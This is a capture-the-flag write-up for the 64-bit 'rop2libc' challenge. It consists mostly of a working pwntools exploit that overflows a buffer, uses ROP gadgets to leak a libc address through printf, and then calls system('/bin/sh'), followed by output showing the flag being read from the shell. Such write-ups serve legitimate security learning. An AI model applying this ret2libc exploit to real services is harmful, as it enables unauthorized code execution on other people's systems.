### Solved by superkojiman

At some point, the organizers decided to recompile all the binaries into 64-bit since some teams were apparently bruteforcing ASLR. Points were removed for AnswerMachine and rop2libc, so I had to redo those. 

The same concept as the 32-bit exploit, so have a look at that for the details. Only difference this time was I had to make use of some ROP gadgets to populate the registers before returning to printf() and system().

```python
#!/usr/bin/env python

from pwn import *

"""
handy dandy gadgets
0x0000000000400633: pop rdi; ret;
0x0000000000400631: pop rsi; pop r15; ret;
"""

off_libc_start_main = 0x0000000000021dd0
off_system          = 0x0000000000046640
off_bin_sh          = 0x000000000017ccdb

buf = ""
buf += "A"*72

# stage 1 leak and return to vuln()
buf += p64(0x400631)    # pop rsi; pop r15
buf += p64(0x601020)    # address to leak 
buf += p64(0x424242)    # r15: junk
buf += p64(0x400633)    # pop rdi;
buf += p64(0x40065e)    # rdi: ptr to "%s"
buf += p64(0x400450)    # printf@plt
buf += p64(0x40057d)    # ret2vuln()

#sh = process("./rop2libc")
sh = process("/problems/rop2libc/rop2libc")
sh.sendline(buf)
print sh.recvline()
d = sh.recvline()
print "leaked %d bytes:" % (len(d),)

t = d + "\x00"                      # pad with 0x0 so 8 bytes for u64()
leak = u64(t) - 0xa000000000000     # remove extra "\n"
print "libc_start_main:", hex(leak)

libc_base = leak - off_libc_start_main
print "libc base addr:", hex(libc_base)

addr_system = libc_base + off_system
addr_bin_sh = libc_base + off_bin_sh
print "system:", hex(addr_system)
print "/bin/sh:", hex(addr_bin_sh)

# stage 2 get a shell system("/bin/sh")
buf = ""
buf += "A"*72
buf += p64(0x400633)    # pop rdi;
buf += p64(addr_bin_sh)
buf += p64(addr_system)

print "trying to get shell, again..."
sh.sendline(buf)
sh.interactive()
sh.close()
```

And here's the pwnage once more:

```
team24254@shell:~$ ./sploit.py
[+] Starting program '/problems/rop2libc/rop2libc': Done
You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1\x06@

leaked 7 bytes:
libc_start_main: 0x7f77209e7dd0
libc base addr: 0x7f77209c6000
system: 0x7f7720a0c640
/bin/sh: 0x7f7720b42cdb
trying to get shell, again...
[*] Switching to interactive mode
You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA3\x06@
$ cat /problems/rop2libc/flag.txt
oops_i_think_your_got_sprung_a_leak
```
